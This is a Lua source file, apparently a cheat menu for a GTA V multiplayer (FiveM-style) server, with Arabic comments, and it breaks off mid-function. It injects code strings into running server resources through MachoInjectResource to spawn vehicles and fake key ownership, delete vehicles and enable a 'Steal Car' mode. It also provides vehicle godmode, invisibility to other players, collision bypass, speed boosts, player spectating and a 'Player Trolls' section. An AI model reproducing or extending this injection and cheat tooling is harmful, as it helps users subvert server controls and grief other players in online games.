    -- تفعيل kit التعديل
    SetVehicleModKit(vehicle, 0)
    SetVehicleWheelType(vehicle, 7)
    
    -- تطبيق جميع التعديلات الأساسية (0-16)
    SetVehicleMod(vehicle, 0, GetNumVehicleMods(vehicle, 0) - 1, false) -- Spoiler
    SetVehicleMod(vehicle, 1, GetNumVehicleMods(vehicle, 1) - 1, false) -- Front Bumper
    SetVehicleMod(vehicle, 2, GetNumVehicleMods(vehicle, 2) - 1, false) -- Rear Bumper
    SetVehicleMod(vehicle, 3, GetNumVehicleMods(vehicle, 3) - 1, false) -- Side Skirt
    SetVehicleMod(vehicle, 4, GetNumVehicleMods(vehicle, 4) - 1, false) -- Exhaust
    SetVehicleMod(vehicle, 5, GetNumVehicleMods(vehicle, 5) - 1, false) -- Frame
    SetVehicleMod(vehicle, 6, GetNumVehicleMods(vehicle, 6) - 1, false) -- Grille
    SetVehicleMod(vehicle, 7, GetNumVehicleMods(vehicle, 7) - 1, false) -- Hood
    SetVehicleMod(vehicle, 8, GetNumVehicleMods(vehicle, 8) - 1, false) -- Fender
    SetVehicleMod(vehicle, 9, GetNumVehicleMods(vehicle, 9) - 1, false) -- Right Fender
    SetVehicleMod(vehicle, 10, GetNumVehicleMods(vehicle, 10) - 1, false) -- Roof
    SetVehicleMod(vehicle, 11, GetNumVehicleMods(vehicle, 11) - 1, false) -- Engine
    SetVehicleMod(vehicle, 12, GetNumVehicleMods(vehicle, 12) - 1, false) -- Brakes
    SetVehicleMod(vehicle, 13, GetNumVehicleMods(vehicle, 13) - 1, false) -- Transmission
    SetVehicleMod(vehicle, 14, 16, false) -- Horn
    SetVehicleMod(vehicle, 15, GetNumVehicleMods(vehicle, 15) - 2, false) -- Suspension
    SetVehicleMod(vehicle, 16, GetNumVehicleMods(vehicle, 16) - 1, false) -- Armor
    
    -- تفعيل التعديلات الخاصة
    ToggleVehicleMod(vehicle, 17, true) -- Turbo
    ToggleVehicleMod(vehicle, 18, true) -- Tire Smoke
    ToggleVehicleMod(vehicle, 19, true) -- Xenon Lights
    ToggleVehicleMod(vehicle, 20, true) -- Front Wheels
    ToggleVehicleMod(vehicle, 21, true) -- Custom Tires
    ToggleVehicleMod(vehicle, 22, true) -- Bulletproof Tires
    
    -- تعديلات إضافية
    SetVehicleMod(vehicle, 23, 1, false) -- Front Wheels
    SetVehicleMod(vehicle, 24, 1, false) -- Back Wheels
    SetVehicleMod(vehicle, 25, GetNumVehicleMods(vehicle, 25) - 1, false) -- Plate Holder
    SetVehicleMod(vehicle, 27, GetNumVehicleMods(vehicle, 27) - 1, false) -- Trim Design
    SetVehicleMod(vehicle, 28, GetNumVehicleMods(vehicle, 28) - 1, false) -- Ornaments
    SetVehicleMod(vehicle, 30, GetNumVehicleMods(vehicle, 30) - 1, false) -- Dial Design
    SetVehicleMod(vehicle, 33, GetNumVehicleMods(vehicle, 33) - 1, false) -- Steering Wheel
    SetVehicleMod(vehicle, 34, GetNumVehicleMods(vehicle, 34) - 1, false) -- Shifter Leavers
    SetVehicleMod(vehicle, 35, GetNumVehicleMods(vehicle, 35) - 1, false) -- Plaques
    SetVehicleMod(vehicle, 38, GetNumVehicleMods(vehicle, 38) - 1, true) -- Hydraulics
    
    -- إعدادات النوافذ والإطارات
    SetVehicleWindowTint(vehicle, 1) -- Dark tint
    SetVehicleTyresCanBurst(vehicle, false) -- Bulletproof tires
    SetVehicleNumberPlateTextIndex(vehicle, 5) -- Plate style
    
    -- إضاءة النيون
    SetVehicleNeonLightEnabled(vehicle, 0, true) -- Left
    SetVehicleNeonLightEnabled(vehicle, 1, true) -- Right
    SetVehicleNeonLightEnabled(vehicle, 2, true) -- Front
    SetVehicleNeonLightEnabled(vehicle, 3, true) -- Back
    SetVehicleNeonLightsColour(vehicle, 222, 222, 255) -- Light blue color
end

-- Max Tuning Button
MachoMenuButton(oyer, "Max Tuning", function()
    local playerPed = PlayerPedId()
    
    -- التحقق من وجود اللاعب في سيارة
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- التحقق من وجود السيارة
        if DoesEntityExist(vehicle) then
            -- تطبيق التعديل الكامل
            MaxOut(vehicle)
            MachoMenuNotification("Max Tuning", "Vehicle fully tuned with all upgrades!")
        else
            MachoMenuNotification("Error", "Vehicle not found!")
        end
    else
        MachoMenuNotification("Error", "You must be in a vehicle to tune it!")
    end
end)


-- دالة إصلاح السيارة كاملة
local function cc()
    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
    if DoesEntityExist(vehicle) then
        SetVehicleFixed(vehicle)
        SetVehicleDirtLevel(vehicle, 0.0)
        SetVehicleLights(vehicle, 0)
        SetVehicleBurnout(vehicle, false)
        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
        SetVehicleUndriveable(vehicle, false)
    end
end

-- دالة إصلاح المحرك
local function cd()
    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
    if DoesEntityExist(vehicle) then
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
        SetVehicleUndriveable(vehicle, false)
    end
end
-- زر القائمة لحذف السيارة

-- زر إصلاح السيارة كاملة
MachoMenuButton(oyer, "Repair Vehicle", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        cc()
        MachoMenuNotification("Repair", "Vehicle fully repaired!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)



-- زر إصلاح المحرك
MachoMenuButton(oyer, "Repair Engine", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        cd()
        MachoMenuNotification("Repair", "Engine repaired!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)
MachoMenuButton(oyer, "Delete Vehicle", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        MachoInjectResource("any",[[DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), false))]])
        MachoMenuNotification("Delete", "Vehicle deleted successfully!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)

-- متغير لحفظ المفتاح المختار
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Repair Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId()
    
            if IsPedInAnyVehicle(playerPed, false) then
                cc()
                MachoMenuNotification("Repair", "Vehicle fully repaired!")
            else
                MachoMenuNotification("Error", "You must be in a vehicle!")
            end
    end
end)
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Repair engine Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId()
    
        if IsPedInAnyVehicle(playerPed, false) then
            cd()
            MachoMenuNotification("Repair", "Engine repaired!")
        else
            MachoMenuNotification("Error", "You must be in a vehicle!")
        end
    end
end)
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Delete Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId() -- ✅ تحديث بيانات اللاعب داخل الدالة
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            MachoInjectResource("any",[[DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), false))]]) -- حذف السيارة
            MachoMenuNotification("Delete", "Vehicle deleted successfully!")
        else
            MachoMenuNotification("Error", "You must be in a vehicle!")
        end
    end
end)
MachoMenuCheckbox(VehicleCheck, "Steal Car", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
            local playerPed = PlayerPedId()
            SetPedConfigFlag(playerPed, 342, false)
            SetPedConfigFlag(playerPed, 252, true)
            SetPedConfigFlag(playerPed, 186, true)
            SetPedConfigFlag(playerPed, 187, true)
        ]])
        
        MachoMenuNotification("Player", " Steal Car Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                local playerPed = PlayerPedId()
                SetPedConfigFlag(playerPed, 342, true)
                SetPedConfigFlag(playerPed, 252, false)
                SetPedConfigFlag(playerPed, 186, false)
                SetPedConfigFlag(playerPed, 187, false)
            ]])
            
            MachoMenuNotification("Player", "Steal Car Mode disabled")
        end
    end
)


MachoMenuText(oyer,"Vehicle Spawn")


-- Text input for Vehicle Model
local VehicleModelInput = MachoMenuInputbox(oyer, "Vehicle Model", "e.g., sultan")

-- Variable for giving key
local GiveKey = false

-- Vehicle Creation Button (with automatic key giving)
MachoMenuButton(oyer, "Create Vehicle", function()
    local modelName = MachoMenuGetInputbox(VehicleModelInput)

    if modelName and modelName ~= "" then
        MachoInjectResource("any", string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)

            if not IsModelInCdimage(modelHash) then
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Invalid model: %s' } })
                return
            end

            RequestModel(modelHash)
            while not HasModelLoaded(modelHash) do
                Wait(0)
            end

            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)

            if vehicle and vehicle ~= 0 then
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                TaskWarpPedIntoVehicle(ped, vehicle, -1)

                -- Always give key
                local plate = GetVehicleNumberPlateText(vehicle)
                TriggerEvent("vehiclekeys:client:SetOwner", plate)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created and key given!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Failed to create vehicle!' } })
            end

            SetModelAsNoLongerNeeded(modelHash)
        ]], modelName, modelName))

        MachoMenuNotification("Vehicle System", "Vehicle created and key given!")
    else
        MachoMenuNotification("Error", "Enter a valid vehicle model!")
    end
end)


local antiKnockOffLoop = false

MachoMenuCheckbox(VehicleCheck, "Seat belt", 
   function()
       antiKnockOffLoop = true
       MachoMenuNotification("Seat belt", "Activated")
       
       Citizen.CreateThread(function()
           while antiKnockOffLoop do
               local playerPed = PlayerPedId()
               SetPedCanBeKnockedOffVeh(playerPed, false)
               Citizen.Wait(100)
           end
           
           -- Restore when disabled
           local playerPed = PlayerPedId()
           SetPedCanBeKnockedOffVeh(playerPed, true)
       end)
   end,
   function()
       antiKnockOffLoop = false
       MachoMenuNotification("Seat belt", "Deactivated")
   end
)


MachoMenuCheckbox(VehicleCheck, "Rainbow Vehicle Colour", 
    function()
        RainbowCar = true
        MachoMenuNotification("Rainbow Car", "Activated")
        
        Citizen.CreateThread(function()
            while RainbowCar do
                local playerPed = PlayerPedId()
                
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    local rainbowColor = getRainbowColor()
                    
                    -- Set primary color
                    SetVehicleCustomPrimaryColour(
                        vehicle,
                        rainbowColor.r,
                        rainbowColor.g,
                        rainbowColor.b
                    )
                    
                    -- Set secondary color
                    SetVehicleCustomSecondaryColour(
                        vehicle,
                        rainbowColor.r,
                        rainbowColor.g,
                        rainbowColor.b
                    )
                end
                
                Citizen.Wait(50) -- Update every 50ms for smooth rainbow effect
            end
        end)
    end,
    function()
        RainbowCar = false
        MachoMenuNotification("Rainbow Car", "Deactivated")
    end
)


-- Horn Boost Checkbox
local HornBoost = false

MachoMenuCheckbox(VehicleCheck, "Horn Boost", 
    function()
        HornBoost = true
        MachoMenuNotification("Horn Boost", "Activated - Press E while in vehicle")
        
        Citizen.CreateThread(function()
            while HornBoost do
                if HornBoost and IsPedInAnyVehicle(PlayerPedId(), true) then
                    if IsControlPressed(1, 38) then -- E key
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 80.0)
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        HornBoost = false
        MachoMenuNotification("Horn Boost", "Deactivated")
    end
)


-- Vehicle Bunny Hop Checkbox
local JumpMod = false

MachoMenuCheckbox(VehicleCheck, "Vehicle  Jump {SPACE}", 
    function()
        JumpMod = true
        MachoMenuNotification("Vehicle Bunny Hop", "Activated - Press SPACE to jump")
        
        Citizen.CreateThread(function()
            while JumpMod do
                if JumpMod and IsPedInAnyVehicle(PlayerPedId(), false) then
                    if IsControlJustPressed(1, 22) then -- SPACE key
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                        ApplyForceToEntity(
                            vehicle,
                            3,
                            0.0, -- X force
                            0.0, -- Y force
                            9.0, -- Z force (upward)
                            0.0, -- X offset
                            0.0, -- Y offset
                            0.0, -- Z offset
                            0.0,
                            0.0,
                            1,
                            1,
                            0.0,
                            1
                        )
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        JumpMod = false
        MachoMenuNotification("Vehicle Bunny Hop", "Deactivated")
    end
)
local GhostNoSideCollision = false

MachoMenuCheckbox(VehicleCheck, "Ghost Vehicle (Only Collides With Ground)", 
    function()
        GhostNoSideCollision = true
        MachoMenuNotification("Ghost Mode", "Activated - Only collides with ground")

        Citizen.CreateThread(function()
            while GhostNoSideCollision do
                local ped = PlayerPedId()
                if IsPedInAnyVehicle(ped, false) then
                    local vehicle = GetVehiclePedIsIn(ped, false)

                    -- تعطيل الاصطدام مؤقتاً بالكامل
                    SetEntityCollision(vehicle, false, false)

                    -- إعادة التجميد لحظة لتحديث التعارض
                    FreezeEntityPosition(vehicle, true)
                    FreezeEntityPosition(vehicle, false)

                    -- نحافظ على تأثير الجاذبية
                    SetEntityHasGravity(vehicle, true)
                    SetVehicleOnGroundProperly(vehicle)

                    -- نخلي السيارة تمر من كل شيء، لكن تبقى على الأرض
                    local vehicles = GetGamePool("CVehicle")
                    for _, otherVeh in ipairs(vehicles) do
                        if otherVeh ~= vehicle then
                            SetEntityNoCollisionEntity(vehicle, otherVeh, true)
                            SetEntityNoCollisionEntity(otherVeh, vehicle, true)
                        end
                    end

                    local peds = GetGamePool("CPed")
                    for _, otherPed in ipairs(peds) do
                        local ent = GetVehiclePedIsIn(otherPed, false)
                        if ent ~= 0 and ent ~= vehicle then
                            SetEntityNoCollisionEntity(vehicle, ent, true)
                            SetEntityNoCollisionEntity(ent, vehicle, true)
                        end
                    end
                end
                Citizen.Wait(500)
            end
        end)
    end,
    function()
        GhostNoSideCollision = false
        MachoMenuNotification("Ghost Mode", "Deactivated - Collision restored")

        local ped = PlayerPedId()
        if IsPedInAnyVehicle(ped, false) then
            local vehicle = GetVehiclePedIsIn(ped, false)

            -- إعادة الاصطدام
            SetEntityCollision(vehicle, true, true)
            FreezeEntityPosition(vehicle, true)
            FreezeEntityPosition(vehicle, false)
        end
    end
)






-- تعريف المتغير
local VehGood = false

-- تشيك بوكس ماتشو
MachoMenuCheckbox(VehicleCheck, "Vehicle Godmode", 
    function()
        VehGood = true
    end,
    function()
        VehGood = false
    end
)

-- الـ loop الرئيسي (يشتغل في الـ main thread)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if VehGood and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
        end
    end
end)
local vehicleInvisibilityAlpha = 255 -- القيمة الافتراضية (مرئي بالكامل)
local vehicleInvisibilityLoop = false
local selectedVehicleKey = 0

local VehicleInvisibilitySlider = MachoMenuSlider(VehicleCheck, "Vehicle Invisibility Level", 255, 0, 255, "%", 0, function(Value)
    vehicleInvisibilityAlpha = Value
    
    -- تطبيق التغيير فوراً إذا كان الاختفاء مفعل
    if vehicleInvisibilityLoop then
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            
            -- للكلاينت: التحكم في الشفافية
            if vehicleInvisibilityAlpha == 0 then
                SetEntityVisible(vehicle, false, false)
            else
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
            end
        end
    end
end)

-- Checkbox للتفعيل/الإلغاء
MachoMenuCheckbox(VehicleCheck, "Vehicle Invisible",
    function()
        vehicleInvisibilityLoop = true
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            MachoMenuNotification("Vehicle Invisible", "Activated - Alpha: " .. vehicleInvisibilityAlpha)
        else
            MachoMenuNotification("Vehicle Invisible", "You need to be in a vehicle!")
            vehicleInvisibilityLoop = false
            return
        end
        
        CreateThread(function()
            while vehicleInvisibilityLoop do
                local playerPed = PlayerPedId()
                
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    
                    -- للآخرين: إخفاء كامل دائماً
                    SetEntityVisible(vehicle, false, false)
                    
                    -- للكلاينت فقط: جعل السيارة مرئية محلياً
                    SetEntityLocallyVisible(vehicle)
                    
                    -- تطبيق مستوى الشفافية للكلاينت
                    if vehicleInvisibilityAlpha == 0 then
                        SetEntityAlpha(vehicle, 0, false)
                    else
                        SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
                    end
                else
                    -- إذا خرج من السيارة، أوقف الاختفاء
                    vehicleInvisibilityLoop = false
                    MachoMenuNotification("Vehicle Invisible", "Deactivated - Left vehicle")
                end
                
                Wait(0)
            end
            
            -- إرجاع السيارة للحالة الطبيعية عند الإلغاء
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, 255, false)
            end
        end)
    end,
    function()
        vehicleInvisibilityLoop = false
        MachoMenuNotification("Vehicle Invisible", "Deactivated")
        
        -- إرجاع السيارة للحالة الطبيعية
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            SetEntityVisible(vehicle, true, false)
            SetEntityAlpha(vehicle, 255, false)
        end
    end
)

-- Keybind للاختصار
MachoMenuKeybind(VehicleCheck, "Vehicle Invisible Key", 0, function(key, toggle)
    selectedVehicleKey = key
end)

-- وظيفة الاختصار
MachoOnKeyDown(function(key)
    if key == selectedVehicleKey and selectedVehicleKey ~= 0 then
        if not vehicleInvisibilityLoop then
            vehicleInvisibilityLoop = true
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                MachoMenuNotification("Vehicle Invisible", "Activated - Alpha: " .. vehicleInvisibilityAlpha)
            else
                MachoMenuNotification("Vehicle Invisible", "You need to be in a vehicle!")
                vehicleInvisibilityLoop = false
                return
            end
            
            CreateThread(function()
                while vehicleInvisibilityLoop do
                    local playerPed = PlayerPedId()
                    
                    if IsPedInAnyVehicle(playerPed, false) then
                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        
                        -- للآخرين: إخفاء كامل
                        SetEntityVisible(vehicle, false, false)
                        
                        -- للكلاينت: جعل السيارة مرئية محلياً
                        SetEntityLocallyVisible(vehicle)
                        
                        -- تطبيق مستوى الشفافية
                        if vehicleInvisibilityAlpha == 0 then
                            SetEntityAlpha(vehicle, 0, false)
                        else
                            SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
                        end
                    else
                        -- إذا خرج من السيارة، أوقف الاختفاء
                        vehicleInvisibilityLoop = false
                        MachoMenuNotification("Vehicle Invisible", "Deactivated - Left vehicle")
                    end
                    
                    Wait(0)
                end
                
                -- إرجاع السيارة للحالة الطبيعية عند الإلغاء
                local playerPed = PlayerPedId()
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    SetEntityVisible(vehicle, true, false)
                    SetEntityAlpha(vehicle, 255, false)
                end
            end)
        else
            vehicleInvisibilityLoop = false
            MachoMenuNotification("Vehicle Invisible", "Deactivated")
            
            -- إرجاع السيارة للحالة الطبيعية
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, 255, false)
            end
        end
    end
end)
local shiftBoostSpeed = 50.0 -- السرعة الافتراضية للـ Shift Boost
local shiftBoostActive = false
local shiftBoostLoop = false

-- سلايدر واحد لتحديد سرعة الـ Shift Boost
local ShiftBoostSlider = MachoMenuSlider(VehicleCheck, "Shift Boost Speed", 100, 100, 150, "km/h", 0, function(Value)
    shiftBoostSpeed = tonumber(Value)
end)

-- Checkbox لتفعيل/إلغاء تفعيل الـ Shift Boost
MachoMenuCheckbox(VehicleCheck, "Shift Boost",
    function()
        shiftBoostActive = true
        shiftBoostLoop = true
        MachoMenuNotification("Shift Boost", "Activated - Hold Shift while driving")
        
        Citizen.CreateThread(function()
            while shiftBoostLoop do
                -- التحقق من أن اللاعب في مركبة
                if shiftBoostActive and IsPedInAnyVehicle(PlayerPedId(), true) then
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    
                    -- التحقق من أن اللاعب هو السائق
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        -- التحقق من الضغط على Shift (مفتاح 21)
                        if IsControlPressed(1, 21) then -- Left Shift
                            -- الحصول على السرعة الحالية
                            local currentSpeed = GetEntitySpeed(vehicle) * 3.6 -- تحويل من m/s إلى km/h
                            local targetSpeed
                            
                            -- منطق السرعة الذكي
                            if currentSpeed > shiftBoostSpeed then
                                -- إذا كانت السيارة أسرع من قيمة السلايدر، قلل السرعة تدريجياً
                                targetSpeed = currentSpeed - (currentSpeed * 0.02) -- تقليل تدريجي بنسبة 2%
                            else
                                -- إذا كانت السيارة أبطأ من قيمة السلايدر، زد السرعة بنسبة 5%
                                targetSpeed = currentSpeed + (shiftBoostSpeed * 0.05)
                                
                                -- تأكد من عدم تجاوز الحد الأقصى
                                if targetSpeed > shiftBoostSpeed * 1.2 then
                                    targetSpeed = shiftBoostSpeed * 1.2
                                end
                            end
                            
                            -- تطبيق السرعة المحسوبة (تحويل مرة أخرى إلى m/s)
                           SetVehicleForwardSpeed(vehicle,targetSpeed / 3.6)
                        end
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        shiftBoostActive = false
        shiftBoostLoop = false
        MachoMenuNotification("Smart Shift Boost", "Deactivated")
    end
)
local groundMagnetActive = false
local groundMagnetLoop = false

-- Checkbox لتفعيل/إلغاء تفعيل المغناطيس الأرضي
MachoMenuCheckbox(VehicleCheck, "Light Ground Magnet",
    function()
        groundMagnetActive = true
        groundMagnetLoop = true
        MachoMenuNotification("Light Ground Magnet", "Activated - Gentle ground attraction")
        
        Citizen.CreateThread(function()
            while groundMagnetLoop do
                -- التحقق من أن اللاعب في مركبة
                if groundMagnetActive and IsPedInAnyVehicle(PlayerPedId(), true) then
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    
                    -- التحقق من أن اللاعب هو السائق
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        
                        local velocity = GetEntityVelocity(vehicle)
                        local vehicleHeight = GetEntityHeightAboveGround(vehicle)
                        
                        -- جاذبية خفيفة جداً فقط لو كانت في الهواء
                        if vehicleHeight > 1.0 then
                            local downwardForce = velocity.z - 2.0 -- جذب خفيف جداً
                            
                            -- تطبيق الجاذبية الخفيفة
                            SetEntityVelocity(vehicle, velocity.x, velocity.y, downwardForce)
                        end
                        
                    end
                end
                Citizen.Wait(100) -- تحديث أبطأ
            end
        end)
    end,
    function()
        groundMagnetActive = false
        groundMagnetLoop = false
        MachoMenuNotification("Light Ground Magnet", "Deactivated")
    end
)




MachoMenuText(MenuWindow,"Players & Vehicles")
local MainTab = MachoMenuAddTab(MenuWindow, "Player list")
local sdSERVERCFWSectionChildWidth = MenuSize.x - TabsBarWidth
local sdSERVERCFWEachSectionWidth = (sdSERVERCFWSectionChildWidth - 20) / 2

local PlayerSection = MachoMenuGroup(MainTab, "Player Trolls", 
    TabsBarWidth + EachSectionWidth + 10, 5 + MachoPaneGap, 
    MenuSize.x - 5, MenuSize.y - 5)

local InfoSection = MachoMenuGroup(MainTab, "Main & Info", 
    TabsBarWidth + 5, 5 + MachoPaneGap, 
    TabsBarWidth + sdSERVERCFWEachSectionWidth, MenuSize.y - 5)

local TextHandles = {}
for i = 1, 5 do
    TextHandles[i] = MachoMenuText(InfoSection, (i == 1 and "Name: ") or (i == 2 and "player ID: ") or (i == 3 and "Distance: ") or
        (i == 4 and "Driving: ") or (i == 5 and "Alive: ") .. "Waiting for a select")
end

local function generateRandomText(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local randomText = ""
    for i = 1, length do
        local randIndex = math.random(1, #chars)
        randomText = randomText .. string.sub(chars, randIndex, randIndex)
    end
    return randomText
end

local function generateTransitionText(targetText, currentIndex)
    if currentIndex >= #targetText then
        return targetText
    end
    local partialText = string.sub(targetText, 1, currentIndex)
    local remainingLength = #targetText - currentIndex
    return partialText .. generateRandomText(remainingLength)
end

local function getPlayerInfo(player)
    if not player or not DoesEntityExist(GetPlayerPed(player)) then
        return nil
    end

    local ped = GetPlayerPed(player)
    local myPed = PlayerPedId()
    local info = {}

    info[1] = "Name: " .. (GetPlayerName(player) or "Unknown")
    info[2] = "Player ID: " .. (GetPlayerServerId(player) or "Unknown")

    local myCoords = GetEntityCoords(myPed)
    local playerCoords = GetEntityCoords(ped)
    local distance = #(myCoords - playerCoords)
    info[3] = string.format("Distance: %.0f m", distance)

    info[4] = "Driving: " .. (IsPedInAnyVehicle(ped, false) and "Yes" or "No")
    info[5] = "Alive: " .. (IsPedDeadOrDying(ped, true) and "No" or "Yes")

    return info
end

Citizen.CreateThread(function()
    local currentPlayer = nil
    local transitionIndices = {0, 0, 0, 0, 0}
    local isTransitioning = false
    local targetTexts = {"", "", "", "", ""}

    while true do
        local player = MachoMenuGetSelectedPlayer()

        if player and type(player) == "number" and NetworkIsPlayerActive(player) and DoesEntityExist(GetPlayerPed(player)) then
            if player ~= currentPlayer then
                currentPlayer = player
                local info = getPlayerInfo(player)
                if info then
                    for i = 1, 5 do
                        targetTexts[i] = info[i]
                        transitionIndices[i] = 0
                    end
                    isTransitioning = true
                end
            end

            if isTransitioning then
                local allDone = true
                for i = 1, 5 do
                    if transitionIndices[i] <= #targetTexts[i] then
                        MachoMenuSetText(TextHandles[i], generateTransitionText(targetTexts[i], transitionIndices[i]))
                        transitionIndices[i] = transitionIndices[i] + 1
                        allDone = false
                    end
                end
                if allDone then
                    isTransitioning = false
                    for i = 1, 5 do
                        MachoMenuSetText(TextHandles[i], targetTexts[i])
                    end
                end
                Citizen.Wait(25)
            else
                local info = getPlayerInfo(player)
                if info then
                    for i = 1, 5 do
                        MachoMenuSetText(TextHandles[i], info[i])
                    end
                end
                Citizen.Wait(25)
            end
        else
            currentPlayer = nil
            isTransitioning = false
            for i = 1, 5 do
                local prefix = (i == 1 and "Name: ") or (i == 2 and "Player ID: ") or (i == 3 and "Distance: ") or
                               (i == 4 and "Driving: ") or (i == 5 and "alive: ")
                MachoMenuSetText(TextHandles[i], prefix .. "Waiting for a select")
            end
            Citizen.Wait(25)
        end
    end
end)
local isSpectating = false
local spectateCamera = nil
local spectatingTarget = nil
local camRot = vector3(0.0, 0.0, 0.0)
local camDistance = 5.0

MachoMenuCheckbox(InfoSection, "Spectate Player",  
    function()
        local selectedPlayer = MachoMenuGetSelectedPlayer()
        if not selectedPlayer or selectedPlayer == -1 then
            return MachoMenuNotification("Error", "No player selected")
        end

        local targetPed = GetPlayerPed(selectedPlayer)
        if not DoesEntityExist(targetPed) then
            return MachoMenuNotification("Error", "Player not found")
        end

        isSpectating = true
        spectatingTarget = selectedPlayer
        SetPlayerControl(PlayerId(), false, 0)

        -- إعداد الكاميرا
        spectateCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        SetCamActive(spectateCamera, true)
        RenderScriptCams(true, true, 0, true, true)

        Citizen.CreateThread(function()
            while isSpectating and DoesEntityExist(GetPlayerPed(spectatingTarget)) do
                local ped = GetPlayerPed(spectatingTarget)
                local targetCoords = GetEntityCoords(ped)

                -- قراءة حركة الماوس
